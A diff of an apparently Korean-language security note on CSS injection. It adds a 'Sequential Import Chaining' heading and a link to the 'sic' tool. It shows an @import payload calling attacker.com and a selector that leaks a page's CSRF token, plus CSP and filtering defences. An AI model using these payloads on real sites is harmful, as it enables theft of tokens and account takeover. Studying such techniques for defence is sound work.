@@ -40,7 +40,7 @@ bgColor=#ffffff;position:fixed;...[위와 동일]
 ```
 
 ```
-# In Tag
+# Sequential Import Chaining
 <style>@import ("https://attacker.com/POC.css")</style>
 
 # POC.css
@@ -59,6 +59,10 @@ input[name=csrf][value^=9]{
 ## Security Measures
 가장 좋은 방법은 사용자가 임의로 `<style>` 태그 및 속성을 삽입할 수 없도록 조치하는 것입니다.   
 서비스 특성 상 해당 조치 방법이 어려울 경우 CSP 정책을 통해 외부 링크에서 .css 파일을 가져오지 못하도록 하고, `position` 속성 등을 필터링 하여 악성 링크가 담긴 태그가 페이지 내 자유롭게 위치할 수 없도록 해야 합니다.
+
+## Tools
+[Sequential Import Chaining sic](https://github.com/d0nutptr/sic)
+
 ## References
 [Better Exfiltration via HTML Injection](https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b)   
 [CSS Injection](https://book.hacktricks.xyz/kr/pentesting-web/xs-search/css-injection)
